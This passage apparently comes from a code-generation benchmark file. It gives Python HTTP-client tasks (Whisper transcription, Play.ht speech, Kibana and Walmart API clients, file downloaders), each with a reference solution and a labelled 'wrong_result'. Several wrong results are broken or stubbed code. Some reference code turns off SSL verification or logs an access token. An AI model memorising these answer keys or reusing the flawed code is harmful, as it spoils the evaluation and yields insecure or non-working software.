   files: Any = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        json: Optional[dict[str, Any]] = None,\n        params: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.post(\n                url,\n                content=content,\n                data=data,\n                files=files,\n                json=json,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def download_file(\n        cls,\n        url: Union[str, list[str]],\n        path: Union[str, Path],\n        *,\n        params: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> bool:\n        if isinstance(path, str):\n            path = Path(path)\n        path.parent.mkdir(parents=True, exist_ok=True)\n        \n        try:\n            response = await cls.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                use_proxy=use_proxy,\n                proxy=proxy,\n                timeout=timeout,\n                **kwargs,\n            )\n            response.raise_for_status()\n            async with aiofiles.open(path, \"wb\") as wf:\n                await wf.write(response.content)\n            return True\n        except (TimeoutError, ConnectTimeout, HTTPStatusError) as e:\n            return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nfrom httpx import AsyncClient, Response\nfrom typing import Union, Optional, Any, Dict\nfrom pathlib import Path\nimport asyncio\n\nclass AsyncHttpx:\n    proxy: ClassVar[dict[str, Union[str, None]]] = {\n        'http': None,\n        'https': None\n    }\n\n    async def get(self, url: Union[str, list[str]], *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response:\n        if isinstance(url, str):\n            url = [url]\n        return await self._get_first_successful(url, params=params, headers=headers, cookies=cookies, verify=verify, use_proxy=use_proxy, proxy=proxy, timeout=timeout, **kwargs)\n\n    async def _get_first_successful(self, urls: list[str], **kwargs) -> Response:\n        for url in urls:\n            try:\n                return await self._get_single(url, **kwargs)\n            except Exception:\n                continue\n        raise Exception('All URLs failed')\n\n    async def _get_single(self, url: str, *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response:\n        async with AsyncClient() as client:\n            if use_proxy:\n                proxy = proxy or self.proxy\n            return await client.get(url, params=params, headers=headers, cookies=cookies, verify=verify, proxy=proxy, timeout=timeout, **kwargs)\n\n    async def post(self, url: str, *, data: Optional[dict[str, Any]] = None, content: Any = None, files: Any = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, json: Optional[dict[str, Any]] = None, params: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response:\n        async with AsyncClient() as client:\n            if use_proxy:\n                proxy = proxy or self.proxy\n            return await client.post(url, data=data, content=content, files=files, verify=verify, proxy=proxy, json=json, params=params, headers=headers, cookies=cookies, timeout=timeout, **kwargs)\n\n    async def download_file(self, url: Union[str, list[str]], path: Union[str, Path], *, params: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> bool:\n        if isinstance(url, str):\n            url = [url]\n        for url in url:\n            try:\n                async with AsyncClient() as client:\n                    if use_proxy:\n                        proxy = proxy or self.proxy\n                    response = await client.get(url, params=params, verify=verify, proxy=proxy, headers=headers, cookies=cookies, timeout=timeout, stream=True)\n                    if response.status_code == 200:\n                        with open(path, 'wb') as f:\n                            async for chunk in response.aiter_bytes():\n                                f.write(chunk)\n                        return True\n            except Exception:\n                continue\n        return False\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Implement a function to send audio data to the Hugging Face Whisper ASR (Automatic Speech Recognition) model API and retrieve the transcribed text.\n\nFunction Description: The function `get_audio_transcript` takes audio data in base64-encoded string format, decodes it, sends it to the Hugging Face Whisper API, and returns the transcribed text. It handles errors and exceptions appropriately, providing feedback if the API request fails.\n\nInput:\n- `ctx`: [Context] - The context object for sending responses or errors back to the caller.\n- `sender`: [str] - Identifier for the sender to direct the response to.\n- `audiodata`: [str] - Base64-encoded string representing the audio data to be transcribed.\n\nOutput:\n- The function does not return a value directly but sends the result or error back through the `ctx` object:\n  - On success: Sends an `AudioTranscriptResponse` containing the transcribed text.\n  - On failure: Sends an `Error` containing the error message from the API or exception details.",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\n\nWHISPER_URL = \"https://api-inference.huggingface.co/models/openai/whisper-large-v2\"\n\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def get_audio_transcript(ctx: Context, sender: str, audiodata: str):\n    try:\n        audiodata = audiodata.encode(\"ascii\")\n        audioBytes = base64.b64decode(audiodata)\n\n        response = requests.post(WHISPER_URL, headers=HEADERS, data=audioBytes)\n\n        if response.status_code != 200:\n            await ctx.send(sender, Error(error=f\"Error: {response.json().get('error')}\"))\n            return\n\n        await ctx.send(sender, AudioTranscriptResponse(transcript=response.json().get('text')))\n        return\n\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception detail: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport base64\nimport requests\nfrom dataclasses import dataclass\nfrom typing import Optional\n\n@dataclass\nclass AudioTranscriptResponse:\n    transcript: str\n\ndef get_audio_transcript(ctx, sender, audiodata: str):\n    try:\n        audio_bytes = base64.b64decode(audiodata)\n        response = requests.post(\"https://api-inference.huggingface.co/models/openai/whisper\", data=audio_bytes)\n        response.raise_for_status()\n        transcript = response.json()\n        ctx.send(sender, AudioTranscriptResponse(transcript))\n    except Exception as e:\n        ctx.send(sender, Error(str(e)))\n```"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Python class that interacts with the Play.ht API to synthesize text into speech and return the audio as an AudioSegment object.\n\nClass Description: The PlayHtSynthesizer class provides functionality to convert text to speech using the Play.ht API. It handles API authentication, request construction, and response processing to return audio in a usable format.\n\nAttributes:\n- voice: str - The voice identifier to be used for speech synthesis\n- sample_rate: int - The audio sample rate (default: 24000)\n- speed: Optional[float] - The playback speed of the synthesized speech\n- preset: Optional[str] - The voice preset to use\n- api_key: Optional[str] - The API key for Play.ht authentication\n- user_id: Optional[str] - The user ID for Play.ht authentication\n- tts_endpoint: str - The API endpoint for text-to-speech synthesis (default: \"https://play.ht/api/v2/tts/stream\")\n\nMethods:\n- __init__(voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None) -> None - Initializes the synthesizer with configuration parameters\n- synthesize(text: str) -> AudioSegment - Converts the input text to speech using the Play.ht API and returns the audio as an AudioSegment object",
    "Canonical_solution": "import io\nfrom typing import Optional\nimport requests\nfrom pydub import AudioSegment\n\nclass PlayHtSynthesizer:\n    def __init__(\n        self,\n        voice: str,\n        sample_rate: int = 24000,\n        speed: Optional[float] = None,\n        preset: Optional[str] = None,\n        api_key: Optional[str] = None,\n        user_id: Optional[str] = None,\n    ):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"X-User-ID\": self.user_id,\n            \"Accept\": \"audio/mpeg\",\n            \"Content-Type\": \"application/json\",\n        }\n        body = {\n            \"voice\": self.voice,\n            \"text\": text,\n            \"sample_rate\": self.sample_rate,\n        }\n        if self.speed is not None:\n            body[\"speed\"] = self.speed\n        if self.preset is not None:\n            body[\"preset\"] = self.preset\n\n        response = requests.post(self.tts_endpoint, headers=headers, json=body, timeout=5)\n        if not response.ok:\n            raise Exception(f\"Play.ht API error: {response.status_code}, {response.text}\")\n\n        return AudioSegment.from_mp3(io.BytesIO(response.content))",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom typing import Optional\nfrom pydub import AudioSegment\nimport requests\n\nclass PlayHtSynthesizer:\n    def __init__(self, voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"Authorization\": f\"Bearer {self.api_key}\"\n        }\n        data = {\n            \"text\": text,\n            \"voice\": self.voice,\n            \"sample_rate\": self.sample_rate,\n            \"speed\": self.speed,\n            \"preset\": self.preset,\n            \"user_id\": self.user_id\n        }\n        response = requests.post(self.tts_endpoint, headers=headers, json=data)\n        audio_data = response.content\n        audio_segment = AudioSegment.from_file_bytes(\"audio.wav\", format=\"wav\", frame_rate=self.sample_rate, sample_width=2, channels=1)\n        return audio_segment\n```"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Python class that interacts with a REST API, handling both synchronous and asynchronous task creation, with proper error handling and API availability checking.\n\nClass Description: The `Api` class provides an interface to interact with a REST API, allowing for synchronous and asynchronous task creation. It includes methods to verify API availability, create tasks, and handle API responses and errors.\n\nAttributes:\n- _api_url: str - The base URL of the API endpoint, defaults to \"http://127.0.0.1:8000\" if not provided\n- _create_response_files: bool - Flag indicating whether to create response files (unused in current implementation)\n\nMethods:\n- __init__(api_url: Optional[str] = None, create_response_files: bool = True) -> None - Initializes the API client with optional custom URL and response file setting\n- is_api_running() -> bool - Checks if the API is available by making a GET request to the base endpoint\n- create_async_task(data, scraper_name=None) -> dict - Creates an asynchronous task by sending a POST request with the provided data\n- create_sync_task(data, scraper_name=None) -> dict - Creates a synchronous task by sending a POST request with the provided data\n- _make_api_url(path) -> str - Helper method to construct full API URLs by combining base URL with endpoint path\n- _raise_for_status(response) -> None - Internal method to handle HTTP response status codes and raise appropriate exceptions",
    "Canonical_solution": "import requests\nfrom requests.exceptions import ConnectionError\nfrom typing import Optional\n\nclass ApiException(Exception):\n    pass\n\nclass Api:\n    def __init__(self, api_url: Optional[str] = None, create_response_files: bool = True) -> None:\n        DEFAULT_API_URL = \"http://127.0.0.1:8000\"\n        self._api_url = api_url if api_url else DEFAULT_API_URL\n        self._create_response_files = create_response_files\n        if not self.is_api_running():\n            raise ApiException(f\"API at {self._api_url} is not running. Please check if the API is up and running.\")\n\n    def _make_api_url(self, path):\n        return f\"{self._api_url}/{path}\"\n\n    def is_api_running(self) -> bool:\n        try:\n            response = requests.get(self._make_api_url(\"api\"))\n            return response.status_code == 200\n        except ConnectionError:\n            raise ApiException(f\"API at {self._api_url} is not running. Check the network connection or verify if the API is running on a different endpoint.\")\n\n    def create_async_task(self, data, scraper_name=None):\n        url = self._make_api_url(\"api/tasks/create-task-async\")\n        payload = {\n            \"data\": data,\n            \"scraper_name\": scraper_name,\n        }\n        response = requests.post(url, json=payload)\n        self._raise_for_status(response)\n        return response.json()\n\n    def create_sync_task(self, data, scraper_name=None):\n        url = self._make_api_url(\"api/tasks/create-task-sync\")\n        payload = {\n            \"data\": data,\n            \"scraper_name\": scraper_name,\n        }\n        response = requests.post(url, json=payload)\n        self._raise_for_status(response)\n        return response.json()\n\n    def _raise_for_status(self, response):\n        if 400 <= response.status_code < 500:\n            data = response.json()\n            message = data.get(\"message\")\n            if message:\n                raise ApiException(message)\n            else:\n                response.raise_for_status()    \n        elif 500 <= response.status_code < 600:\n            response.raise_for_status()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Optional, Dict\n\nclass Api:\n    def __init__(self, api_url: Optional[str] = None, create_response_files: bool = True) -> None:\n        self._api_url = api_url if api_url else \"http://127.0.0.1:8000\"\n        self._create_response_files = create_response_files\n\n    def is_api_running(self) -> bool:\n        try:\n            response = requests.get(self._make_api_url(\"\"))\n            self._raise_for_status(response)\n            return True\n        except requests.exceptions.RequestException:\n            return False\n\n    def create_async_task(self, data, scraper_name=None) -> Dict:\n        return self._create_task(data, scraper_name, \"async\")\n\n    def create_sync_task(self, data, scraper_name=None) -> Dict:\n        return self._create_task(data, scraper_name, \"sync\")\n\n    def _create_task(self, data, scraper_name, task_type) -> Dict:\n        url = self._make_api_url(f\"/{task_type}/\")\n        if scraper_name:\n            url += f\"?scraper_name={scraper_name}\"\n        response = requests.post(url, json=data)\n        self._raise_for_status(response)\n        return response.json()\n\n    def _make_api_url(self, path) -> str:\n        return self._api_url + path\n\n    def _raise_for_status(self, response):\n        try:\n            response.raise_for_status()\n        except requests.exceptions.HTTPError as err:\n            raise Exception(f\"HTTP error occurred: {err}\")\n        except requests.exceptions.RequestException as err:\n            raise Exception(f\"Error occurred: {err}\")\n```\n"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local path.\n\nFunction Description: The function uses the Python requests library to make an HTTP GET request to download a file from a provided URL. It checks the response status code to ensure the request was successful, creates necessary directories for the local path if they don't exist, and saves the file content to the specified location.\n\nInput:\n- url: str - The URL of the file to download\n- local_path: str - The local file path where the downloaded content should be saved\n\nOutput:\n- None - The function doesn't return any value but prints status messages indicating success or failure of the download operation",
    "Canonical_solution": "import os\nimport requests\nfrom urllib.parse import urljoin\n\ndef download_file(url, local_path):\n    response = requests.get(url)\n    if response.status_code == 200:\n        os.makedirs(os.path.dirname(local_path), exist_ok=True)\n        with open(local_path, 'wb') as f:\n            f.write(response.content)\n        print(f\"Downloaded: {local_path}\")\n    else:\n        print(response.status_code)\n        print(f\"Failed to download: {url}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef download_file(url, local_path):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        os.makedirs(os.path.dirname(local_path), exist_ok=True)\n        with open(local_path, 'wb') as file:\n            file.write(response.content)\n        print(f\"File downloaded successfully and saved to {local_path}\")\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to download file from {url}: {e}\")\n```"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local folder.\n\nFunction Description: The function downloads a file from the provided URL using HTTP GET request and saves it to the specified folder. It handles folder creation if it doesn't exist and provides feedback on the download status.\n\nInput:\n- url: str - The URL of the file to download\n- folder_path: str - The local directory path where the file should be saved\n\nOutput:\n- None - The function doesn't return any value but saves the file to disk and prints status messages",
    "Canonical_solution": "import os\nimport requests\n\ndef download_file(url: str, folder_path: str) -> None:\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n\n    # Extract filename from URL\n    filename = url.split(\"/\")[-1]\n\n    # Define path to save the file\n    file_path = os.path.join(folder_path, filename)\n\n    # Send a GET request to the URL\n    response = requests.get(url)\n\n    # Check if request was successful (status code 200)\n    if response.status_code == 200:\n        # Save the file to the specified folder\n        with open(file_path, \"wb\") as f:\n            f.write(response.content)\n        print(f\"File downloaded successfully to {file_path}\")\n    else:\n        print(f\"Failed to download file. Status code: {response.status_code}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef download_file(url, folder_path):\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n    \n    # Send HTTP GET request to download the file\n    response = requests.get(url, stream=True)\n    \n    # Check if the request was successful\n    if response.status_code == 200:\n        # Extract the file name from the URL\n        file_name = url.split(\"/\")[-1]\n        \n        # Save the file to the specified folder\n        file_path = os.path.join(folder_path, file_name)\n        with open(file_path, 'wb') as file:\n            for chunk in response.iter_content(chunk_size=8192):\n                file.write(chunk)\n        \n        print(f\"File downloaded successfully and saved to {file_path}\")\n    else:\n        print(f\"Failed to download the file. Status code: {response.status_code}\")\n```\n"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Python class that serves as an HTTP client for interacting with Kibana and Elasticsearch APIs, handling authentication, requests, and responses for various operations.\n\nClass Description: The KibanaHTTPClient class provides methods to interact with Kibana's saved objects and Elasticsearch's templates through HTTP requests. It handles authentication, SSL verification, and response parsing.\n\nAttributes:\n- username: str - The username for authentication (default: \"redelk\")\n- password: str - The password for authentication (default: None)\n- verify_ssl: bool - Flag to enable/disable SSL verification (default: False)\n- scheme: str - The URL scheme (default: \"https\")\n- kibana_url: str - The base URL for Kibana API (default: \"https://localhost:5601\")\n- es_url: str - The base URL for Elasticsearch API (default: \"https://localhost:9200\")\n- headers: dict - HTTP headers including \"kbn-xsrf\" for Kibana requests\n\nMethods:\n- fetch_kibana_object(obj_type: str) -> list - Fetches Kibana saved objects of specified type by making a POST request to Kibana's export API. Returns parsed NDJSON response.\n- fetch_es_template(template_name: str) -> dict - Retrieves an Elasticsearch template by name via GET request. Returns parsed JSON response.\n- fetch_es_component_templates() -> dict - Gets all Elasticsearch component templates via GET request. Returns parsed JSON response.\n- fetch_es_index_templates() -> dict - Retrieves all Elasticsearch index templates via GET request. Returns parsed JSON response.",
    "Canonical_solution": "import requests\nimport json\nimport ndjson\nimport os\nimport re\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = \"https\"\n        self.kibana_url = f\"{self.scheme}://localhost:5601\"\n        self.es_url = f\"{self.scheme}://localhost:9200\"\n        self.headers = {\"kbn-xsrf\": \"true\"}\n\n    def fetch_kibana_object(self, obj_type):\n        try:\n            response = requests.post(\n                f\"{self.kibana_url}/api/saved_objects/_export\",\n                json={\"type\": obj_type},\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n                headers=self.headers,\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return ndjson.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching kibana object {obj_type}: {error}\")\n\n    def fetch_es_template(self, template_name):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_template/{template_name}\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return json.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching ES template {template_name}: {error}\")\n\n    def fetch_es_component_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_component_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES component templates: {error}\")\n\n    def fetch_es_index_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_index_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES index templates: {error}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\nimport base64\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False, scheme=\"https\", kibana_url=\"https://localhost:5601\", es_url=\"https://localhost:9200\"):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = scheme\n        self.kibana_url = kibana_url\n        self.es_url = es_url\n        self.headers = {\"kbn-xsrf\": \"true\"}\n\n    def fetch_kibana_object(self, obj_type: str) -> list:\n        url = f\"{self.kibana_url}/api/saved_objects/_export?type={obj_type}\"\n        auth = (self.username, self.password)\n        response = requests.post(url, auth=auth, verify=self.verify_ssl, headers=self.headers)\n        return [json.loads(line) for line in response.text.splitlines()]\n\n    def fetch_es_template(self, template_name: str) -> dict:\n        url = f\"{self.es_url}/_template/{template_name}\"\n        auth = (self.username, self.password)\n        response = requests.get(url, auth=auth, verify=self.verify_ssl)\n        return response.json()\n\n    def fetch_es_component_templates(self) -> dict:\n        url = f\"{self.es_url}/_component_template\"\n        auth = (self.username, self.password)\n        response = requests.get(url, auth=auth, verify=self.verify_ssl)\n        return response.json()\n\n    def fetch_es_index_templates(self) -> dict:\n        url = f\"{self.es_url}/_template\"\n        auth = (self.username, self.password)\n        response = requests.get(url, auth=auth, verify=self.verify_ssl)\n        return response.json()\n```"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Python class to interact with the Walmart Marketplace API, handling authentication, order management, and inventory operations.\n\nClass Description: The WalmartAPI class provides methods to authenticate with and interact with the Walmart Marketplace API. It supports user verification, order retrieval and acknowledgment, as well as inventory management operations.\n\nAttributes:\napi_key: str - Walmart API key for authentication\naccess_token: str - Access token for API authorization\nmarketplace_id: str - Marketplace identifier for API requests\n\nMethods:\nverify_user: verify_user() -> None - Verifies the current access token corresponds to a valid user. Raises exception if verification fails.\nget_orders: get_orders(status: str, start_date: Optional[datetime], end_date: Optional[datetime], limit: int) -> List[Dict] - Retrieves orders from Walmart Marketplace with optional filters for status, date range, and limit.\nacknowledge_order: acknowledge_order(purchase_order_id: str) -> str - Acknowledges a specific order by purchase order ID.\nget_inventory: get_inventory(sku_list: List[str]) -> List[Dict] - Gets inventory levels for specified SKUs or all inventory if no SKUs provided.\nupdate_inventory: update_inventory(sku: str, quantity: int) -> str - Updates inventory quantity for a specific SKU.",
    "Canonical_solution": "import os\nimport logging\nimport requests\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Optional\n\nclass WalmartAPI:\n    def __init__(self, api_key: str = None, access_token: str = None, marketplace_id: str = None):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self):\n        \"\"\"\n        Verifies that the current access token corresponds to a valid user.\n        If verification fails, raises an exception.\n        \"\"\"\n        logging.info(f\"Verifying user with token: {self.access_token}\")\n        headers = {\n            \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n            \"WM_SVC.NAME\": \"Walmart Marketplace\",\n            \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n            \"Accept\": \"application/json\",\n        }\n\n        response = requests.get(\n            \"https://marketplace.walmartapis.com/v3/seller/info\", headers=headers\n        )\n\n        if response.status_code != 200:\n            raise Exception(\n                f\"User verification failed. Status: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    async def get_orders(\n        self,\n        status: str = \"Created\",\n        start_date: Optional[datetime] = None,\n        end_date: Optional[datetime] = None,\n        limit: int = 100,\n    ) -> List[Dict]:\n        \"\"\"\n        Retrieves orders from Walmart Marketplace.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            if not start_date:\n                start_date = datetime.now() - timedelta(days=7)\n            if not end_date:\n                end_date = datetime.now()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {\n                \"status\": status,\n                \"createdStartDate\": start_date.isoformat(),\n                \"createdEndDate\": end_date.isoformat(),\n                \"limit\": limit,\n            }\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/orders\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch orders: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving orders: {str(e)}\")\n            return []\n\n    async def acknowledge_order(self, purchase_order_id: str) -> str:\n        \"\"\"\n        Acknowledges a Walmart Marketplace order.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            response = requests.post(\n                f\"https://marketplace.walmartapis.com/v3/orders/{purchase_order_id}/acknowledge\",\n                headers=headers,\n            )\n\n            if response.status_code == 204:\n                return \"Order acknowledged successfully.\"\n            else:\n                raise Exception(f\"Failed to acknowledge order: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error acknowledging order: {str(e)}\")\n            return f\"Failed to acknowledge order: {str(e)}\"\n\n    async def get_inventory(self, sku_list: List[str] = None) -> List[Dict]:\n        \"\"\"\n        Gets inventory levels for specified SKUs.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Accept\": \"application/json\",\n            }\n\n            params = {}\n            if sku_list:\n                params[\"sku\"] = \",\".join(sku_list)\n\n            response = requests.get(\n                \"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                params=params,\n            )\n\n            if response.status_code != 200:\n                raise Exception(f\"Failed to fetch inventory: {response.text}\")\n\n            return response.json().get(\"elements\", [])\n\n        except Exception as e:\n            logging.error(f\"Error retrieving inventory: {str(e)}\")\n            return []\n\n    async def update_inventory(self, sku: str, quantity: int) -> str:\n        \"\"\"\n        Updates inventory quantity for a specific SKU.\n        \"\"\"\n        try:\n            self.verify_user()\n\n            headers = {\n                \"WM_SEC.ACCESS_TOKEN\": self.access_token,\n                \"WM_SVC.NAME\": \"Walmart Marketplace\",\n                \"WM_QOS.CORRELATION_ID\": self.marketplace_id,\n                \"Content-Type\": \"application/json\",\n            }\n\n            data = {\"sku\": sku, \"quantity\": {\"unit\": \"EACH\", \"amount\": quantity}}\n\n            response = requests.put(\n                f\"https://marketplace.walmartapis.com/v3/inventory\",\n                headers=headers,\n                json=data,\n            )\n\n            if response.status_code == 200:\n                return \"Inventory updated successfully.\"\n            else:\n                raise Exception(f\"Failed to update inventory: {response.text}\")\n\n        except Exception as e:\n            logging.error(f\"Error updating inventory: {str(e)}\")\n            return f\"Failed to update inventory: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom datetime import datetime\nfrom typing import Optional, List, Dict\n\nclass WalmartAPI:\n    def __init__(self, api_key: str, access_token: str, marketplace_id: str):\n        self.api_key = api_key\n        self.access_token = access_token\n        self.marketplace_id = marketplace_id\n\n    def verify_user(self) -> None:\n        # Implement user verification logic here\n        pass\n\n    def get_orders(self, status: str, start_date: Optional[datetime] = None, end_date: Optional[datetime] = None, limit: int = 10) -> List[Dict]:\n        # Implement order retrieval logic here\n        pass\n\n    def acknowledge_order(self, purchase_order_id: str) -> str:\n        # Implement order acknowledgment logic here\n        pass\n\n    def get_inventory(self, sku_list: List[str] = []) -> List[Dict]:\n        # Implement inventory retrieval logic here\n        pass\n\n    def update_inventory(self, sku: str, quantity: int) -> str:\n        # Implement inventory update logic here\n        pass\n```\n"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Python function that makes an HTTP request to a specified API endpoint, handles the response, and manages errors appropriately. The function should support proxy configuration and include request signing.\n\nFunction Description: The `request` function sends an HTTP request to a predefined API endpoint. It constructs the request with proper parameters, handles the connection (including proxy support if configured), processes the response, and manages errors. The function includes logging for debugging and error tracking.\n\nInput:\n- `action`: [str] - The API endpoint action to be called (appended to '/api/')\n- `param`: [dict, optional] - A dictionary of parameters to be sent with the request\n- `**params`: [dict] - Additional parameters to be merged with `param`\n\nOutput:\n- Returns: [dict] - The 'data' field from the JSON response if successful\n- Raises:\n  - Exception: If the HTTP status code indicates an error (non-2xx)\n  - Exception: If the API response contains an error code\n  - Exception: If the response data is None\n\nThe function performs the following steps:\n1. Merges input parameters and signs them\n2. Establishes an HTTPS connection (with optional proxy support)\n3. Sends the request with proper headers\n4. Reads and decodes the response\n5. Validates the response status and content\n6. Returns the parsed data or raises appropriate exceptions",
